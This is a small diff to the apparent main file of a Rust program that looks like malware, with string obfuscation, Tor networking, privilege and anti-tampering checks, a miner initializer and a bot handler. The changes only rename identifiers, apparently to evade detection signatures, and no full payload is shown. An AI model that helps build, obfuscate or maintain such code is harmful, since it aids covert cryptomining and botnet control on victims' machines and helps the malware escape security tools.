@@ -8,7 +8,7 @@ use obfstr::obfstr as s;
 use shared::{
     constants::logs_encryption_key,
     logs::logger::Logger,
-    network::tor::LoggerConfig,
+    network::tor::LoggerCnfg,
     uac::checks::is_system,
     utils::{ anti_tampering::is_clean, config::load_mib_config, functions::exit_1 },
 };
@@ -121,7 +121,7 @@ async fn main() {
 
     let mib_config = load_mib_config(false);
 
-    if !mib_config.clean_up_done {
+    if !mib_config.cln_up_done {
         exit_1();
     }
 
@@ -145,7 +145,7 @@ async fn main() {
         err!("initialize_miner failed: ", error);
     }
 
-    let config = LoggerConfig::Existing(LOGGER.lock().unwrap().clone());
+    let config = LoggerCnfg::Existing(LOGGER.lock().unwrap().clone());
     if let Ok(mut bot_handler) = BotHandler::new(config).await {
         bot_handler.run_handler().await;
     };
